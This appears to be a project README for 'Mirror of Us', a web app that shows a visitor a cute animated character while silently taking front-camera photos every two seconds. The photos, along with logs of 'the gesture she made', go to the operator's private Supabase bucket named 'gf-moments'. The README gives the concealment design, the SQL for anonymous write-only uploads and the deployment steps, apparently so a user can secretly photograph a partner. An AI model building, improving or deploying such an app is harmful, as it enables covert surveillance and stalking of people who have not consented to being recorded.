# Mirror of Us ♡

A mobile-first, romantic camera experience made with HTML, CSS, and vanilla JavaScript. 

The user sees a cute, lively animated character that smiles, waves, dances, and sends hearts back in response to their movements. Behind the scenes, high-resolution photo snapshots are captured silently every 2 seconds and uploaded directly to your private Supabase storage.

**Strict Privacy**: The website itself contains **no gallery or public dashboard**. All captured photos and metadata are stored exclusively in your private Supabase project, accessible only by you.

---

## Highlights

- **2-Second Silent Photo Engine**: Captures photos every 2 seconds via `<canvas>` directly from the front camera. No video recording overhead, zero iOS Safari codec errors.
- **Real Animated Character Reactions**: Features cute animated GIF stickers (`smile.gif`, `wave.gif`, `dance.gif`, `heart.gif`, `talk.gif`) that react dynamically to detected gestures.
- **MediaPipe AI Recognition**: Real-time gesture classification:
  - 2-Hand Heart Shape (`heart_shape`)
  - Waving Hand (`wave`)
  - Dancing / Body Movement (`dance`)
  - Speaking / Nodding (`talking`)
  - Resting / Smiling (`low_movement`)
- **100% Mobile & iOS Safari Friendly**: Configured with `playsinline`, `webkit-playsinline`, and `audio: false` (no microphone permission prompt).
- **Private & Secure**: Client is write-only. Nobody visiting the site can list, view, or download captured photos.

---

## How to View Captured Photos (Supabase Dashboard)

Since there is no public dashboard on the website, all photos are accessed directly by you in your Supabase project:

1. Log in to [supabase.com](https://supabase.com) and open your project.
2. Go to **Storage** in the left sidebar:
   - Click on the `gf-moments` bucket.
   - You will see date folders (e.g. `2026-09-05/`).
   - Click any folder to view, preview, or download the full-resolution captured `.jpg` photos.
3. Go to **Table Editor** -> `moments` to see the full timeline of actions:
   - `file_url`: The storage path of the photo.
   - `detected_action`: The gesture she made (e.g. `heart_shape`, `wave`, `dance`).
   - `created_at`: The exact timestamp of the moment.

---

## Supabase Database & Storage Setup

1. Create a private bucket named `gf-moments`.
2. Run this SQL in your Supabase SQL Editor:

```sql
create extension if not exists pgcrypto;

-- 1. Moments metadata table
create table public.moments (
  id uuid primary key default gen_random_uuid(),
  file_url text not null,
  file_type text not null check (file_type in ('photo', 'video')),
  detected_action text not null,
  animation_shown text not null,
  created_at timestamptz not null default now()
);

-- 2. Row Level Security
alter table public.moments enable row level security;

-- Allow anonymous inserts from the mirror app
create policy "anonymous can insert moment metadata"
on public.moments for insert to anon with check (true);

-- Allow anonymous uploads into the gf-moments bucket
create policy "anonymous can upload moments"
on storage.objects for insert to anon
with check (bucket_id = 'gf-moments');
-- (Keep bucket private: do not add a public SELECT policy so photos are only viewable by you in the Supabase Dashboard)
```

---

## Running Locally

Because camera APIs require a secure context (HTTPS or localhost):

```bash
npx serve .
```

Open `http://localhost:3000` (or your local network IP on your phone) to test.

---

## Deployment (Vercel)

1. Import this repository into [Vercel](https://vercel.com) (Framework: **Other** / None).
2. Set Root Directory to `./`.
3. Deploy! Vercel provides HTTPS automatically, allowing camera permissions on iPhone and Android.
